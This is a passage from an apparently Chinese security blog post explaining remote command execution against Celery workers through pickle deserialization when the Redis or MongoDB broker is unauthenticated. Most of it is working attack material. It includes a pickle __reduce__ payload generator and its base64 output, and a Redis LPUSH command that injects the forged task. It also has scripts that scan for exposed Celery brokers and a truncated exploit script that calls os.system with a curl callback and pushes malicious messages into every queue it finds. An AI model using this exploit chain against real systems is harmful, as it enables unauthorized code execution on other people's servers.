根据具体的调用请求去寻找注册的函数使用参数进行调用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">而刚刚提到的 Reids 中的键 _kombu.binding.celery 表示存在一个名为 celery 的队列，其 exchange 和 routing_key 的信息保存在该集合里：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/7-124" rel="attachment wp-att-89653"><img src="http://p7.qhimg.com/t01862867b4ca381983.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">而键&nbsp;celery&nbsp;里面存储的就是每一个 push 到队列里面的具体消息信息：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/8-111" rel="attachment wp-att-89654"><img src="http://p2.qhimg.com/t014b612cbd152d326b.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到是一个 JSON 格式的数据，为了更方便的进行字段分析，将其提出来格式化显示为：</span></p><table width="NaN" style="width: 1113px;"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box; padding: 0px !important; border: none !important; vertical-align: top !important; margin: 0px !important; background: 0px 50%;" class="firstRow"><td data-settings="show" style="box-sizing: border-box; border: 0px; padding: 0px !important; vertical-align: top !important; margin: 0px !important; color: rgb(84, 153, 222) !important; background: rgb(223, 239, 255) !important;"><br/></td><td style="box-sizing: border-box; border: 0px; padding: 0px !important; vertical-align: top !important; margin: 0px !important; background: 0px 50%;" width="2579"><p style="text-indent: 2em;"><br/></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;&quot;body&quot;:&nbsp;&quot;gAJ9cQAoWAMAAAB1dGNxAYhYAgAAAGlkcQJYJAAAADFkOGZhN2FlLTEyZjYtNDIyOS05ZWI5LTk5ZDViYmI5ZGFiZXEDWAUAAABjaG9yZHEETlgGAAAAa3dhcmdzcQV9cQZYBAAAAHRhc2txB1gRAAAAY2VsZXJ5X3NpbXBsZS5hZGRxCFgIAAAAZXJyYmFja3NxCU5YAwAAAGV0YXEKTlgJAAAAY2FsbGJhY2tzcQtOWAQAAABhcmdzcQxLBEsJhnENWAcAAAB0YXNrc2V0cQ5OWAcAAABleHBpcmVzcQ9OWAkAAAB0aW1lbGltaXRxEE5OhnERWAcAAAByZXRyaWVzcRJLAHUu&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&quot;headers&quot;:&nbsp;{},
&nbsp;&nbsp;&nbsp;&nbsp;&quot;content-encoding&quot;:&nbsp;&quot;binary&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&quot;content-type&quot;:&nbsp;&quot;application/x-python-serialize&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&quot;properties&quot;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;body_encoding&quot;:&nbsp;&quot;base64&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;reply_to&quot;:&nbsp;&quot;c8b55284-c490-3927-85c5-c68a7fed0525&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;correlation_id&quot;:&nbsp;&quot;1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;delivery_info&quot;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;routing_key&quot;:&nbsp;&quot;celery&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;exchange&quot;:&nbsp;&quot;celery&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;priority&quot;:&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;delivery_mode&quot;:&nbsp;2,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;delivery_tag&quot;:&nbsp;&quot;027bd89a-389e-41d1-857a-ba895e6eccda&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在上面的消息数据中，properties 里包含了消息的路由信息和标识性的 UUID 值，而其中properties.body_encoding 的值则表示消息主体 body 的编码方式，这里默认为 base64 编码。在 Celery 分布式框架中，worker 端在获取到消息数据时会根据 properties.body_encoding 的值对消息主体 body 进行解码，即 base64.b64decode(body)，而消息数据中的 content-type 指明了消息主体（具体的任务数据）的序列化方式，由于采用了默认的配置所以这里使用的是 Python 内置序列化模块 pickle 对任务数据进行的序列化。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"><br/></span></p></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将消息主体经 base64 解码和反序列化（即之前 unserializer.py 文件功能） 操作以后得到具体的任务数据：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/9-94" rel="attachment wp-att-89655"><img src="http://p8.qhimg.com/t01a28e29db11cdac91.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">格式化任务数据为：</span></p><pre class="brush:plain;toolbar:false">{
&nbsp;&nbsp;&nbsp;&nbsp;&#39;args&#39;:&nbsp;(4,&nbsp;9),&nbsp;&nbsp;//&nbsp;传递进&nbsp;celery_simple.add&nbsp;函数中的参数
&nbsp;&nbsp;&nbsp;&nbsp;&#39;timelimit&#39;:&nbsp;(None,&nbsp;None),&nbsp;&nbsp;//&nbsp;celery&nbsp;Task&nbsp;任务执行时间限制
&nbsp;&nbsp;&nbsp;&nbsp;&#39;expires&#39;:&nbsp;None,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;taskset&#39;:&nbsp;None,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;kwargs&#39;:&nbsp;{},
&nbsp;&nbsp;&nbsp;&nbsp;&#39;retries&#39;:&nbsp;0,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;callbacks&#39;:&nbsp;None,&nbsp;&nbsp;//&nbsp;Task&nbsp;任务回调
&nbsp;&nbsp;&nbsp;&nbsp;&#39;chord&#39;:&nbsp;None,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;:&nbsp;&#39;1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe&#39;,&nbsp;&nbsp;//&nbsp;任务唯一&nbsp;ID
&nbsp;&nbsp;&nbsp;&nbsp;&#39;eta&#39;:&nbsp;None,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;errbacks&#39;:&nbsp;None,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;task&#39;:&nbsp;&#39;celery_simple.add&#39;,&nbsp;&nbsp;//&nbsp;任务执行的具体方法
&nbsp;&nbsp;&nbsp;&nbsp;&#39;utc&#39;:&nbsp;True
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">任务数据标明了哪一个注册的 Task 将会被调用执行，其执行的参数是什么等等。这里任务数据已经不在重要，从上面这个分析过程中我们已经得到了这么一个结论：Celery 分布式节点 worker 在获取到消息数据后，默认配置下会使用 pickle 对消息主体进行反序列化。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3. 构造恶意消息数据</span></strong><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么如果在 Broker 中添加一个假任务，其消息主体包含了之前能够进行命令执行的序列化数据，那么在 worker 端对其进行反序列化的时候是不是就能够执行任意代码了呢？下面就来证明这个假设。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里直接对消息主体 body 进行构造，根据第一节回顾的 Python 序列化利用方式，构造 Payload 使得在反序列化的时候能够执行命令并将结果进行返回（方便后面验证）：</span></p><pre class="brush:plain;toolbar:false">import&nbsp;base64
import&nbsp;pickle
import&nbsp;commands
class&nbsp;LS(object):
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__reduce__(self):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(commands.getstatusoutput,&nbsp;(&#39;ls&#39;,&nbsp;))
print(base64.b64encode(pickle.dumps(LS())))</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">运行程序生成具体 Payload 数据：</span></p><pre class="brush:plain;toolbar:false">Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用刚才分析过的消息数据，将消息主体的值替换为上面生成的 Payload 得到构造的假消息：</span></p><pre class="brush:plain;toolbar:false">{
&nbsp;&nbsp;&nbsp;&nbsp;&quot;body&quot;:&nbsp;&quot;Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&quot;headers&quot;:&nbsp;{},
&nbsp;&nbsp;&nbsp;&nbsp;&quot;content-encoding&quot;:&nbsp;&quot;binary&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&quot;content-type&quot;:&nbsp;&quot;application/x-python-serialize&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&quot;properties&quot;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;body_encoding&quot;:&nbsp;&quot;base64&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;reply_to&quot;:&nbsp;&quot;c8b55284-c490-3927-85c5-c68a7fed0525&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;correlation_id&quot;:&nbsp;&quot;1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;delivery_info&quot;:&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;routing_key&quot;:&nbsp;&quot;celery&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;exchange&quot;:&nbsp;&quot;celery&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;priority&quot;:&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;delivery_mode&quot;:&nbsp;2,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;delivery_tag&quot;:&nbsp;&quot;027bd89a-389e-41d1-857a-ba895e6eccda&quot;
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">将假消息通过 Redis 命令行直接添加到&nbsp;celery&nbsp;队列任务中：</span></p><pre class="brush:plain;toolbar:false">127.0.0.1:6379&amp;gt;&nbsp;LPUSH&nbsp;celery&nbsp;&#39;{&quot;body&quot;:&quot;Y2NvbW1hbmRzCmdldHN0YXR1c291dHB1dApwMAooUydscycKcDEKdHAyClJwMwou&quot;,&quot;headers&quot;:{},&quot;content-encoding&quot;:&quot;binary&quot;,&quot;content-type&quot;:&quot;application/x-python-serialize&quot;,&quot;properties&quot;:{&quot;body_encoding&quot;:&quot;base64&quot;,&quot;reply_to&quot;:&quot;c8b55284-c490-3927-85c5-c68a7fed0525&quot;,&quot;correlation_id&quot;:&quot;1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe&quot;,&quot;delivery_info&quot;:{&quot;routing_key&quot;:&quot;celery&quot;,&quot;exchange&quot;:&quot;celery&quot;,&quot;priority&quot;:0},&quot;delivery_mode&quot;:2,&quot;delivery_tag&quot;:&quot;027bd89a-389e-41d1-857a-ba895e6eccda&quot;}}&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">查看一下&nbsp;celery&nbsp;队列中的消息情况：</span></p><p style="text-align: center; text-indent: 0em;"><a href="http://www.mottoin.com/89644.html/10-79" rel="attachment wp-att-89656"><img src="http://p5.qhimg.com/t019d06c4b8f2a0e6c5.png"/></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 2em;">然后起一个 Celery worker 端加载之前的&nbsp;celery_simple.py&nbsp;中的 APP，worker 会从队列中取消息进行处理，当处理到插入的假消息时，会由于无法解析任务数据而报错：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/11-78" rel="attachment wp-att-89657"><img src="http://p5.qhimg.com/t0156f5e369678c6d75.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">worker 端经过<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">&nbsp;pickle.loads(base64.b64decode(body))&nbsp;</span>处理对构造的 Payload 进行的反序列化，由于 Payload 在反序列化时会执行命令并返回执行结构，所以这里 worker 端直接将命令执行的结果当作了任务的具体数据，同时也证明了在 Celery 分布式框架默认配置下（使用了&nbsp;pickle&nbsp;序列化方式），进行恶意消息注入会导致 worker 端远程命令执行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用脆弱的 Broker 代理进行分布式节点攻击</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">前面已经证明了 Celery 构建的应用中，如果攻击者能够控制 Broker 往消息队列中添加任意消息数据，那么即可构造恶意的消息主体数据，使得 worker 端在对其进行反序列化的时候触发漏洞导致任意命令执行。整个流程为：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/12-63" rel="attachment wp-att-89658"><img src="http://p7.qhimg.com/t01d1096ecdecd2bf7c.png"/></a></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 检测 Celery 应用中 Broker 特征</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么对于这样一个分布式应用，攻击者是否能够轻易的控制 Broker 呢？在 Celery 支持的消息队列中间件中含有 Reids、MongoDB 这种存在未授权访问问题的服务，因此当一个基于 Celery 框架实现的分布式应用使用了 Redis 或者 MongoDB 作为 Broker 时，极有可能由于中间件未授权访问的问题而被攻击者利用，进行恶意的消息注入。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以，如何去寻找既存在未授权访问问题，同时又作为 Celery 分布式应用 Broker 的那些脆弱服务呢？根据上一节的分析，已经得知如果 Redis 作为 Broker 时，其 KEYS 值会存在固定的特征：</span></p><pre class="brush:plain;toolbar:false">_kombu.binding.*
celery.*
unacked.*</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">而如果是 MongoDB 作为 Broker，在其数据库中会存在这样的 collections：</span></p><pre class="brush:plain;toolbar:false">messages
messages.broadcast
messages.routing</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其中&nbsp;messages.routing&nbsp;含有每一个队列以及消息路由的信息，messages&nbsp;则存储了所有队列中的消息数据。</span><a href="http://www.mottoin.com/89644.html/13-54" rel="attachment wp-att-89659" style="text-align: center;"><img src="http://p3.qhimg.com/t01c362cde862779529.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么就可以根据不同中间件服务的特征去验证一个 Redis 或者 MongoDB 是否作为 Broker 存在于 Celery 分布式应用中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">针对 Redis 和 MongoDB 可编写出相应的验证脚本，其代码关键部分为：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;celery_broker_redis_check.py
...
CELERY_KEYS&nbsp;=&nbsp;[&#39;celery&#39;,&nbsp;&#39;unacked&#39;,&nbsp;&#39;_kombu.binding&#39;]
def&nbsp;run(seed):
&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip,&nbsp;port&nbsp;=&nbsp;seed.split(&#39;:&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;ValueError&nbsp;as&nbsp;ex:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip,&nbsp;port&nbsp;=&nbsp;seed,&nbsp;6379
&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;redis.Redis(ip,&nbsp;int(port),&nbsp;socket_connect_timeout=5)
&nbsp;&nbsp;&nbsp;&nbsp;keys&nbsp;=&nbsp;r.keys()
&nbsp;&nbsp;&nbsp;&nbsp;info&nbsp;=&nbsp;dict(succeed=False,&nbsp;keys=list())
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;_k&nbsp;in&nbsp;CELERY_KEYS:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;key&nbsp;in&nbsp;keys:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;_k&nbsp;in&nbsp;key:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info[&#39;succeed&#39;]&nbsp;=&nbsp;True
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info[&#39;keys&#39;].append(key)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;info
...</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">针对未授权的 Redis 服务，直接对所有 KEYS 值进行特征匹配，如果遇到其 KEY 值包含有&nbsp;[&#39;celery&#39;, &#39;unacked&#39;, &#39;_kombu.binding&#39;]&nbsp;中任意一个字符串即可判断该服务作为了 Celery 应用的消息队列中间件。</span></p><pre class="brush:plain;toolbar:false">#&nbsp;celery_broker_mongodb_check.py
...
CELERY_COLLECTIONS&nbsp;=&nbsp;[&#39;messages.routing&#39;,&nbsp;&#39;messages.broadcast&#39;]
def&nbsp;run(seed):
&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip,&nbsp;port&nbsp;=&nbsp;seed.split(&#39;:&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;ValueError&nbsp;as&nbsp;ex:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip,&nbsp;port&nbsp;=&nbsp;seed,&nbsp;27017
&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;=&nbsp;pymongo.MongoClient(ip,&nbsp;int(port),&nbsp;connectTimeoutMS=2000,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;serverSelectionTimeoutMS=2000)
&nbsp;&nbsp;&nbsp;&nbsp;dbs&nbsp;=&nbsp;conn.database_names()
&nbsp;&nbsp;&nbsp;&nbsp;info&nbsp;=&nbsp;dict(succeed=False,&nbsp;results=dict())
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;db&nbsp;in&nbsp;dbs:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;colnames&nbsp;=&nbsp;conn.get_database(db).collection_names()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;_col&nbsp;in&nbsp;CELERY_COLLECTIONS:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;any(_col&nbsp;in&nbsp;colname&nbsp;for&nbsp;colname&nbsp;in&nbsp;colnames):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info[&#39;succeed&#39;]&nbsp;=&nbsp;True
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info[&#39;results&#39;][db]&nbsp;=&nbsp;colnames
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;info
...</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">而由于 Celery 在使用 MongoDB 的时候需要指定数据库，所以需要对存在未授权访问的 MongoDB 中的每一个数据库都进行检测，判断其中的集合名称是否符合条件，若符合即可判断其作为了消息队列中间件。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 使用脚本进行消息注入攻击分布式节点</span></strong><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用上面两个脚本在本地环境进行测试：</span></p><p style="text-align:center"><a href="http://www.mottoin.com/89644.html/14-49" rel="attachment wp-att-89660"><img src="http://p8.qhimg.com/t01501085fb5ff1995c.png"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里要说明的一个问题就是，不是所有使用了 Celery 分布式框架的应用都配置了&nbsp;pickle&nbsp;的序列化方式，若其只配置了 JSON 等其他安全的序列化方式，则就无法利用 Python 反序列化进行命令执行了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">一个简单的真对 Redis Broker 类型的攻击脚本：</span></p><pre class="brush:plain;toolbar:false">#&nbsp;celery_broker_redis_exp.py
import&nbsp;re
import&nbsp;json
import&nbsp;redis
import&nbsp;pickle
import&nbsp;base64
evil_command&nbsp;=&nbsp;&#39;curl&nbsp;http://127.0.0.1:8000/{}&#39;
def&nbsp;create_evil_task_body(command,&nbsp;body_encoding=&#39;base64&#39;):
&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;Command(object):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__reduce__(self):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;import&nbsp;os
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(os.system,&nbsp;(command,&nbsp;))
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;body_encoding&nbsp;==&nbsp;&#39;base64&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;base64.b64encode(pickle.dumps(Command()))
def&nbsp;create_evil_message(body):
&nbsp;&nbsp;&nbsp;&nbsp;message&nbsp;=&nbsp;{&quot;body&quot;:&nbsp;body,&quot;headers&quot;:&nbsp;{},&quot;content-encoding&quot;:&nbsp;&quot;binary&quot;,&quot;content-type&quot;:&nbsp;&quot;application/x-python-serialize&quot;,&quot;properties&quot;:&nbsp;{&quot;body_encoding&quot;:&nbsp;&quot;base64&quot;,&quot;reply_to&quot;:&nbsp;&quot;c8b55284-c490-3927-85c5-c68a7fed0525&quot;,&quot;correlation_id&quot;:&nbsp;&quot;1d8fa7ae-12f6-4229-9eb9-99d5bbb9dabe&quot;,&quot;delivery_info&quot;:&nbsp;{&quot;routing_key&quot;:&nbsp;&quot;celery&quot;,&quot;exchange&quot;:&nbsp;&quot;celery&quot;,&quot;priority&quot;:&nbsp;0},&quot;delivery_mode&quot;:&nbsp;2,&quot;delivery_tag&quot;:&nbsp;&quot;027bd89a-389e-41d1-857a-ba895e6eccda&quot;}}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;json.dumps(message)
def&nbsp;exp(seed):
&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip,&nbsp;port&nbsp;=&nbsp;seed.split(&#39;:&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;ValueError&nbsp;as&nbsp;ex:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip,&nbsp;port&nbsp;=&nbsp;seed,&nbsp;6379
&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;redis.Redis(ip,&nbsp;int(port),&nbsp;socket_connect_timeout=5)
&nbsp;&nbsp;&nbsp;&nbsp;keys&nbsp;=&nbsp;r.keys()
&nbsp;&nbsp;&nbsp;&nbsp;info&nbsp;=&nbsp;dict(succeed=False,&nbsp;keys=list())
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;key&nbsp;in&nbsp;keys:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;matched&nbsp;=&nbsp;re.search(r&#39;^_kombu\.binding\.(?P&amp;lt;queue&amp;gt;.*)&#39;,&nbsp;key)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;matched:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;queue_name&nbsp;=&nbsp;matched.group(&#39;queue&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;message&nbsp;=&nbsp;create_evil_message(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_evil_task_body(evil_command.format(queue_name))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r.lpush(queue_name,&nbsp;message)
